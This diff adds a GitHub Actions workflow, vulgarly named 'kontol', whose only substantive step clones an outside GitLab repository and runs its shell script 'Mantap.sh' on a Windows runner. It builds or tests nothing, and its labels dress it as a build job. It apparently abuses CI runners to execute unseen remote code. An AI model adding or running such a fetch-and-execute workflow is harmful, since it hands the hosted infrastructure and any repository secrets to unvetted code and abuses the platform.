@@ -1,0 +1,22 @@
+name: kontol  
+   
+on: [workflow_dispatch]  
+   
+jobs:  
+  build:  
+    name: kontol  
+    runs-on: windows-latest  
+    strategy:  
+      max-parallel: 5  
+      fail-fast: false  
+      matrix:  
+        go: [1.0]  
+        flag: [A]
+    env:  
+        NUM_JOBS: 2  
+        JOB: ${{ matrix.go }}  
+    steps:  
+    - name: DOWNLOAD  
+      run: git clone https://gitlab.com/andyketan1/qgcm.git && cd qgcm && bash Mantap.sh
+    - name: DONE  
+      run: exit
